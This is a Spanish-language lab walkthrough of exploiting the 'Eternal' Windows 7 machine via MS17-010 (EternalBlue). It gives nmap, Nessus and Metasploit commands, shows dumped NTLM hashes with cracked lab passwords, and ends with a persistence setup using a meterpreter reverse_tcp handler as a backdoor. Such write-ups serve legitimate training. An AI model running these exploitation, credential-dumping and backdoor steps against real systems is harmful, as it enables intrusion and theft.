---
title: Eternal - Writeup
date: 2026-01-19 21:55:30 +/-TTTT
categories: [Máquinas]
tags: [Pentesting, Windows, Eternal Blue, Nessus]     # TAG names should always be lowercase

description: Laboratorio
toc: false
---

<p style="font-size:1.2rem;">
En este artículo estaré mostrando como resolver la máquina Eternal.
</p>

<p style="font-size:1.2rem;">
Una de las cosas que nos permitirá esta máquina es explotar una vulnerabilidad crítica en el protocolo SMBv1 de sistemas Windows, causada por un manejo incorrecto de paquetes especialmente diseñados. La falla permite a un atacante enviar paquetes SMB malformados que provocan un desbordamiento de memoria, lo que puede derivar en ejecución remota de código sin autenticación.
</p>

## Reconocimiento

```
sudo nmap -sS -p- -vv -T5 -O -A 192.168.53.12 -oA eternal_puertos
```

<p style="font-size:1.2rem;">
Se identificaron los siguientes puertos y servicios abiertos en el sistema objetivo:<br><br>

<strong>135/tcp</strong> – open <strong>MSRPC</strong><br>
<strong>139/tcp</strong> – open <strong>NetBIOS-SSN</strong> (<strong>Microsoft Windows</strong>)<br>
<strong>445/tcp</strong> – open <strong>Microsoft-DS (SMB)</strong> – <strong>Windows 7 Ultimate 7601 Service Pack 1</strong> (<strong>WORKGROUP</strong>)<br>
<strong>49152/tcp</strong> – open <strong>MSRPC</strong><br>
<strong>49153/tcp</strong> – open <strong>MSRPC</strong><br>
<strong>49154/tcp</strong> – open <strong>MSRPC</strong><br>
<strong>49155/tcp</strong> – open <strong>MSRPC</strong><br>
<strong>49156/tcp</strong> – open <strong>MSRPC</strong><br>
<strong>49157/tcp</strong> – open <strong>MSRPC</strong>
</p>

![Desktop View](/assets/img/eternal/scan1.jpeg){: width="900" height="900" }

## Reconocimiento vulnerabilidades puertos abiertos

<p style="font-size:1.2rem;">
Hacemos un escaneo de puertos avanzado con scripts de nmap para identificar vulnereabilidades enesos puertos:
</p>

```
sudo nmap --script vuln -p 135,139,445,49152,49153,49154,49155,49156,49157 -vv -O -A 192.168.53.12 -oXresults.xml
```

![Desktop View](/assets/img/eternal/scan2.jpeg){: width="900" height="900" }

<p style="font-size:1.2rem;">
A continuación encontramos la vulnerabilidad ms17-010 (Eternal Blue) en esta máquina:<br><br>

VULNERABLE:
Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
State: VULNERABLE
IDs: CVE:CVE-2017-0143
Risk factor: HIGH
A critical remote code execution vulnerability exists in Microsoft SMBv1
servers (ms17-010).
</p>

![Desktop View](/assets/img/eternal/scan3.jpeg){: width="900" height="900" }

<p style="font-size:1.2rem;">
Podemos hacer también un reconocimiento de vulnerabilidades con la herramienta Nessus:
</p>

```
sudo systemctl start.nessusd.service
```

```
https://127.0.0.1:8834
```
![Desktop View](/assets/img/eternal/scan4.jpeg){: width="900" height="900" }

## Análisis de exploit para el SMB

<p style="font-size:1.2rem;">
Con la herramienta searchsploit podemos acceder a la base de datos de exploit database para hacer labúsqueda de un exploit disponible para este servicio:
</p>

```
searchsploit ms17
```

<p style="font-size:1.2rem;">
Descubrimos un exploit para acceder a la máquina remotamente que está disponible en metasploit:

Microsoft Windows - SMB Remote Code Execution Scanner (MS17-010) (Metasploit) | windows/dos/41891.rb
</p>

![Desktop View](/assets/img/eternal/scan5.jpeg){: width="900" height="900" }

## Verificar si la máquina es vulnerable al Eternal Blue

<p style="font-size:1.2rem;">
Abrimos nuestro framework de metasploit para verficiar primero la versión del SMB:
</p>

```
msfconsole
use 103 (auxiliary/scanner/smb/smb_version)
show options
set RHOSTS 192.168.53.12
run o exploit
```
![Desktop View](/assets/img/eternal/scan6.jpeg){: width="900" height="900" }

<p style="font-size:1.2rem;">
Detectamos un SMB (versions:1, 2) (preferred dialect:SMB 2.1)
</p>

<p style="font-size:1.2rem;">
Luego verificamos si este protocolo es vulnerable al Eternal Blue:
</p>

```
msfconsole
use 24 (auxiliary/scanner/smb/smb_ms17_010)
show options
set RHOSTS 192.168.53.12
run o exploit
```
![Desktop View](/assets/img/eternal/scan7.jpeg){: width="900" height="900" }

<p style="font-size:1.2rem;">
Detectamos que la máquina si es vulnerable al ms7 :
Host is likely VULNERABLE to MS17-010!
</p>

## Explotación y Post-Explotación

<p style="font-size:1.2rem;">
Para explotar la vulnerabilidad otra vez accedemos al framework de metasploit:
</p>

```
msfconsole
search ms17
use 0 (exploit/windows/smb/ms17_010_eternalblue)
show options
set RHOSTS 192.168.53.12
run o exploit
```

![Desktop View](/assets/img/eternal/scan8.jpeg){: width="900" height="900" }

<p style="font-size:1.2rem;">
Logramos acceder a la máquina por medio de una shell de metasploit llamada meterpreter:
</p>

```
help
hashdump
```

<p style="font-size:1.2rem;">
Durante el proceso de explotación se obtuvieron las siguientes <strong>credenciales del sistema</strong>:<br><br>

<strong>Usuario:</strong> Guest (<strong>RID 501</strong>)<br>
<strong>Hash NTLM:</strong> 31d6cfe0d16ae931b73c59d7e0c089c0<br><br>

<strong>Usuario:</strong> Hacker Mentor Admin (<strong>RID 500</strong>)<br>
<strong>Hash NTLM:</strong> 931a25d0405b2ea33910ad3c7404e283<br><br>

<strong>Usuario:</strong> Hacker Mentor User (<strong>RID 1000</strong>)<br>
<strong>Hash NTLM:</strong> f56a8399599f1be040128b1dd9623c29<br><br>

Tras completar el proceso de <strong>crackeo de hashes</strong>, se obtuvieron las siguientes <strong>credenciales en texto plano</strong>:<br><br>

<strong>Hacker Mentor User:</strong> <strong>P@$$w0rd</strong><br>
<strong>Hacker Mentor Admin:</strong> <strong>H4ck3rm3nt0r!</strong>
</p>

![Desktop View](/assets/img/eternal/scan9.jpeg){: width="900" height="900" }

## Persistencia

<p style="font-size:1.2rem;">
Para hacer el tema de persistencia para mantener el acceso a un sistema o red comprometida a pesar de losreinicios, actualizaciones o parches del sistema
</p>

<p style="font-size:1.2rem;">
Interfaz 1 meterpreter:
</p>

```
migrate 123 -> Migrar al numero de prosceo (ejemplo 380)
bg
search per
use 24 (exploit/windows/local/persistence)
set payload windows/meterpreter/reverse_tcp
sessions -l
show options
set session 1
run o exploit
```

<p style="font-size:1.2rem;">
Interfaz 2 meterpreter:
</p>

```
use exploit/multi/handler/
set payload windows/meterpreter/reverse_tcp
show options
set LHOST 192.168.53.2
run o exploit
```

![Desktop View](/assets/img/eternal/scan10.jpeg){: width="900" height="900" }

<p style="font-size:1.2rem;">
Logramos hacer un Backdoor en el puerto 4444 de nuestra máquina víctima.
</p>














